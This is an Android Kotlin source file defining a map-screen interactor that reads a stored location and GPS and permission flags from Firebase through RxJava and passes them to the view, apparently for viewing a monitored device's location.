package com.dtz.netservice.ui.fragments.maps

import android.content.Context
import androidx.fragment.app.FragmentManager
import com.dtz.netservice.data.model.Location
import com.dtz.netservice.rxFirebase.InterfaceFirebase
import com.dtz.netservice.ui.activities.base.BaseInteractor
import com.dtz.netservice.utils.Consts.CHILD_GPS
import com.dtz.netservice.utils.Consts.CHILD_PERMISSION
import com.dtz.netservice.utils.Consts.DATA
import com.dtz.netservice.utils.Consts.LOCATION
import com.dtz.netservice.utils.Consts.PARAMS
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.schedulers.Schedulers
import javax.inject.Inject

/**
 * Created by luis rafael on 11/03/18.
 */
class InteractorMaps<V : InterfaceViewMaps> @Inject constructor(supportFragment: FragmentManager, context: Context,
                                                                firebase: InterfaceFirebase) : BaseInteractor<V>(supportFragment, context, firebase), InterfaceInteractorMaps<V> {

    override fun valueEventLocation() {
        getView()!!.addDisposable(firebase().valueEventModel("$LOCATION/$DATA", Location::class.java)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({ if (getView() != null) getView()!!.setLocation(it) },
                        { if (getView() != null) getView()!!.showError(it.message.toString()) }))
    }

    override fun valueEventEnableGps() {
        getView()!!.addDisposable(firebase().valueEvent("$LOCATION/$PARAMS/$CHILD_GPS")
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe { if (getView() != null) getView()!!.setValueState(it) })
    }

    override fun valueEventEnablePermission() {
        getView()!!.addDisposable(firebase().valueEvent("$LOCATION/$PARAMS/$CHILD_PERMISSION")
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe { if (getView() != null) getView()!!.setValuePermission(it) })
    }
}